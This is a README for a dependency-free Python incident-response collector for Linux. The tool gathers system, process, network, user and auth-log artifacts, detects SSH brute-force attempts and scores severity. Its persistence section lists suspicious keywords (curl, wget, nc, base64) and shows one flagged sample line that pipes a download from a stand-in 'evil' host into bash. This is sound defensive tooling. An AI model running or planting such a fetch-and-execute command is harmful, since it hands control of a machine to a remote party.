# linux-ir-collector

A lightweight Linux Incident Response collector written in Python. Designed to be run on a potentially compromised system to gather forensic artifacts, detect common attack patterns, and generate a structured Markdown report — with no external dependencies.

```
Linux system → collectors → artifacts → analysis → severity score → report.md
```

---

## Features

- **6 specialized collectors** — system info, processes, network, users, logs, persistence
- **SSH brute-force detection** — extracts attacker IPs and counts login attempts
- **Persistence mechanism detection** — scans cron jobs and systemd units for suspicious commands
- **Severity scoring** — rates findings as LOW / MEDIUM / HIGH / CRITICAL
- **Timestamped output directory** — each run produces an isolated snapshot
- **Zero external dependencies** — only Python 3 standard library

---

## Requirements

- Linux (Debian/Ubuntu or RHEL/Fedora)
- Python 3.6+
- Root privileges (`sudo`)

---

## Installation

```bash
git clone https://github.com/mh00909/linux-ir-collector.git
cd linux-ir-collector
```

No packages to install.

---

## Usage

```bash
sudo python3 main.py
```

> Root is required to read protected files such as `/etc/shadow`, `/var/log/auth.log`, and network socket information.

After completion, a timestamped directory is created in the current working directory:

```
ir_report_2026-03-07_14-22-01/
```

---

## Output Structure

```
ir_report_<timestamp>/
│
├── system/
│   ├── uname.txt
│   ├── uptime.txt
│   ├── date.txt
│   └── hostnamectl.txt
│
├── processes/
│   ├── ps.txt
│   ├── top.txt
│   └── systemctl_failed.txt
│
├── network/
│   ├── ip_a.txt
│   ├── ip_route.txt
│   └── ss.txt
│
├── users/
│   ├── passwd.txt
│   ├── group.txt
│   └── shadow.txt
│
├── logs/
│   └── auth.txt
│
├── persistence/
│   └── cron.txt
│
└── report.md
```

---

## Collectors

### 1. System
Collects baseline system information for host identification.

Commands: `uname -a`, `uptime`, `date`, `hostnamectl`

### 2. Processes
Captures all running processes and failed systemd units to identify malware, cryptominers, or unauthorized services.

Commands: `ps auxww`, `top -b -n 1`, `systemctl --failed`

### 3. Network
Records network interfaces, routing tables, and listening sockets to detect backdoors and unexpected open ports.

Commands: `ip a`, `ip route`, `ss -tulnp`

### 4. Users
Copies user and group databases for account enumeration and detection of accounts created by malware.

Files: `/etc/passwd`, `/etc/group`, `/etc/shadow`

### 5. Logs
Parses authentication logs to detect SSH brute-force attacks. Extracts source IPs and counts failed login attempts per host.

Files: `/var/log/auth.log`, `/var/log/secure`

Detection pattern:
```
Failed password for <user> from <IP>
```

### 6. Persistence
Scans cron jobs and systemd unit files for commands commonly used to maintain malware persistence.

Suspicious keywords: `curl`, `wget`, `bash`, `nc`, `/tmp`, `base64`

Example of a flagged entry:
```
curl http://evil.sh | bash
```

---

## Report

The final `report.md` summarizes all findings:

```markdown
# Linux Incident Response Report

## System Information
Kernel: 6.8.0
Hostname: server01

## SSH Attacks
Detected 34 failed login attempts
IPs:
  192.168.1.10
  5.188.10.22

## Suspicious Persistence
cron job using curl detected

Severity: HIGH
```

Severity levels:

| Level    | Meaning                                      |
|----------|----------------------------------------------|
| LOW      | Informational findings, no immediate threat  |
| MEDIUM   | Suspicious activity requiring investigation  |
| HIGH     | Strong indicators of compromise              |
| CRITICAL | Active attack or confirmed system compromise |

---

## Typical Incident Response Workflow

```bash
# 1. Suspected breach — run the collector
sudo python3 main.py

# 2. Review the report
less ir_report_<timestamp>/report.md

# 3. Package artifacts for offline analysis or hand-off
tar -czf ir_report.tar.gz ir_report_<timestamp>/
```

The resulting archive can be sent to a security analyst, attached to an incident ticket, or analyzed offline.

---

## Security Notes

- The output directory contains a copy of `/etc/shadow`. Treat it as sensitive and restrict access accordingly (`chmod 700`).
- The tool does not transmit any data over the network. All output is written locally.
- Artifact files are not hashed by default — if chain of custody is required, hash the output directory manually after collection:
  ```bash
  find ir_report_<timestamp>/ -type f -exec sha256sum {} \; > checksums.txt
  ```

---

## Limitations

- Designed for Linux only; not compatible with macOS or Windows.
- Log parsing targets Debian/Ubuntu (`auth.log`) and RHEL/Fedora (`secure`); other distributions may require path adjustments.
- Does not perform memory acquisition or disk imaging.

---

## License

This project is not yet licensed. All rights reserved by the author.